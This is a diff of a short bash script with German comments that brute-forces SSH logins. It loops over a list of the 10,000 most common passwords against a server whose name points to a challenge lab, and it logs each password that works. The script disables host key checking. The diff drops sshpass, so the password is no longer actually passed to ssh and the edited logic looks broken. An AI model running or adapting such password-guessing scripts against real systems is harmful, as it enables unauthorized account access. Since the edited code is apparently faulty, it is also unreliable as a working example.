@@ -4,7 +4,7 @@
 server="server1.challenge-883ad57c-80e2-4f8f-92f4-e8c19d747341.svc.cluster.local"
 
 # Benutzername
-username="anna"
+username="sshuser"
 
 # Datei mit den 10.000 häufigsten Passwörtern
 password_list="./10k-most-common.txt"
@@ -15,7 +15,7 @@ port=22
 # Funktion, um das Passwort zu testen
 check_password() {
     local password="$1"
-    sshpass -p "$password" ssh -o StrictHostKeyChecking=no -p $port $username@$server "echo Anmeldung erfolgreich mit Passwort: $password && exit"
+    ssh -o StrictHostKeyChecking=no -p $port $username@$server "echo Anmeldung erfolgreich mit Passwort: $password && exit" >/dev/null 2>&1
     if [ $? -eq 0 ]; then
         echo "Erfolgreich angemeldet als '$username' mit dem Passwort '$password'"
         echo "Passwort: $password" >> successful_passwords.txt
